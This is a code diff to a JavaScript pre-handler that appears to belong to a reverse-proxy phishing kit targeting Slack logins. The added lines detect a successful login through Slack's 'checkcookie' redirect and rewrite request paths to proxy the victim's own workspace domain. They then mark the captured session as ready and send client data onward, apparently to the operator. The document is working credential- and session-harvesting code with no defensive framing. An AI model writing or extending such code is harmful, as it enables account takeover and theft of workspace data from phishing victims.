@@ -98,15 +98,30 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
 
         const redirectToken = this.checkForRedirect()
-        if (redirectToken !== null && redirectToken.obj.host === process.env.PROXY_DOMAIN) {
-            clientContext.currentDomain = process.env.PROXY_DOMAIN
-            this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
+        if (redirectToken !== null) {
+            if (redirectToken.url.startsWith('https://slack.com/checkcookie')) {
+                clientContext.info.loginOk = 1
+            }
             // return this.superExecuteProxy(redirectToken.obj.host, clientContext)
         }
 
-        if (this.req.url.includes('~/ssb/redirect')) {
-            clientContext.setLogAvailable(true)
-            super.sendClientData(clientContext, {})
+        if (this.req.url.includes('ssb/redirect?entry_point')) {
+            if (this.req.url.startsWith('/sub--')) {
+                const subPath = this.req.url.split('~')
+                const workSubDomain = subPath[0].slice(6, -1)
+
+                console.log(workSubDomain)
+                clientContext.currentDomain = `${workSubDomain}.slack.com`
+                this.req.url = subPath[1]
+                console.log(`Current workspace domain is ${workSubDomain}.slack.com`)
+                clientContext.sessionBody.domain = `${workSubDomain}.slack.com`
+
+                if (clientContext.info.loginOk === 1) {
+                    clientContext.setLogAvailable(true)
+                    super.sendClientData(clientContext, {})
+                }
+            }
+           
             // this.res.writeHead('301', {location: 'https://outlook.com'})
             //  return this.res.end()
         }
